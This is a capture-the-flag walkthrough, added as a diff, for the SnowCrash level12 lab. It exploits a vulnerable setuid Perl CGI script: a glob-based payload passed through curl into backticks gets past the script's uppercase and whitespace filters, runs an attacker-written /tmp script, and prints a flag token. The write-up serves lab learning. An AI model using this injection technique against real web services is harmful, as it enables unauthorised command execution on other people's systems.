@@ -1,0 +1,105 @@
+# Okay lets see what we have by doing a ls -la
+
+level12@SnowCrash:~$ ls -la
+total 16
+dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
+-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
+-r-x------  1 level12 level12  675 Apr  3  2012 .profile
+-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
+
+# Lets see what happens when running the file
+
+level12@SnowCrash:~$ ./level12.pl
+perl: warning: Setting locale failed.
+perl: warning: Please check that your locale settings:
+	LANGUAGE = (unset),
+	LC_ALL = (unset),
+	LC_CTYPE = "UTF-8",
+	LANG = "en_US.UTF-8"
+    are supported and installed on your system.
+perl: warning: Falling back to the standard locale ("C").
+Content-type: text/html
+
+
+# Lets see whats in level12.pl
+
+level11@SnowCrash:~$ vim level12.pl
+
+  1 #!/usr/bin/env perl
+  2 # localhost:4646
+  3 use CGI qw{param};
+  4 print "Content-type: text/html\n\n";
+  5
+  6 sub t {
+  7   $nn = $_[1];
+  8   $xx = $_[0];
+  9   $xx =~ tr/a-z/A-Z/;								# File name needs to be capitals. this changes everything to uppercase and shell commands are casesensitive 
+ 10   $xx =~ s/\s.*//;									# this is dangerous to use as it takes all input to match
+ 11   @output = `egrep "^$xx" /tmp/xd 2>&1`;			# From past experience we know that this is a exploit, from level04 and level06. We must also make a temp file as it reads the file from the temp folder
+ 12   foreach $line (@output) {
+ 13       ($f, $s) = split(/:/, $line);
+ 14       if($s =~ $nn) {
+ 15           return 1;
+ 16       }
+ 17   }
+ 18   return 0;
+ 19 }
+ 20
+ 21 sub n {
+ 22   if($_[0] == 1) {
+ 23       print("..");
+ 24   } else {
+ 25       print(".");
+ 26   }
+ 27 }
+ 28
+ 29 n(t(param("x"), param("y")));
+
+# Rememeber we have the find command. Lets give it a go and see what we find, 
+level12@SnowCrash:~$ find / -iname "level12" 2>/dev/null
+/var/www/level12
+/rofs/var/www/level12
+# this file was the same file given to us if we cat the contents we would see that
+
+
+# We see a few important things in the file.
+	We see on line 2 we have some important information 
+		# localhost:4646
+#	We also see that it will funtion in line 11 on line 12 of the program  
+		@output = `egrep "^$xx" /tmp/xd 2>&1`;
+	The above line will use @output.
+
+
+ # On login we see a perl script that is running a webserver on the port 4646, that can take two get params, x and y.
+ 	We can clearly were we gonna do the exploit here, there is backquote.
+
+# lines 9 and 10 is the 2 regex commands
+9   $xx =~ tr/a-z/A-Z/;
+10   $xx =~ s/\s.*//;
+# line 9 convert every alpha characters to their uppercase equivalence,
+# line 10 remove every space.
+
+# but we can use shell substitution * and create a uppercase file exploit, name /tmp/EXPLOIT, line 9 with 10 /*/EXPLOIT will match it.
+	(don't forget to change permissions)
+
+level12@SnowCrash:~$ vim /tmp/EXPLOIT
+#!/bin/sh
+getflag | wall
+
+level12@SnowCrash:~$ chmod 777 /tmp/EXPLOIT
+
+# Then simply use curl or do a ssh bridge to make a http call.
+
+level12@SnowCrash:~$ curl localhost:4646?x='`/*/EXPLOIT`'
+
+Broadcast Message from flag12@Snow
+        (somewhere) at 11:04 ...
+
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+
+Resources
+https://learn.perl.org/docs/keywords.html
+http://perldoc.perl.org/perlvar.html
